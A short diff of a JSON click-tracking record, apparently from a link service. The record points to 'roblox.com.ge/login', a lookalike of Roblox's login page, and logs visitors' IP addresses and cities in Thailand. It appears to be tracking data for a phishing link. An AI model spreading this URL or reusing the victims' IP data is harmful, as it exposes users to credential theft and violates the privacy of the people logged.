@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1617,
+    "useCount": 1618,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13102,6 +13102,14 @@
         "ip": "223.24.164.217",
         "country": "Thailand",
         "city": "Bangkok",
+        "flag": "🇹🇭",
+        "countryCode": "TH"
+      },
+      {
+        "timestamp": 1777533777900,
+        "ip": "118.175.45.4",
+        "country": "Thailand",
+        "city": "Chon Buri",
         "flag": "🇹🇭",
         "countryCode": "TH"
       }
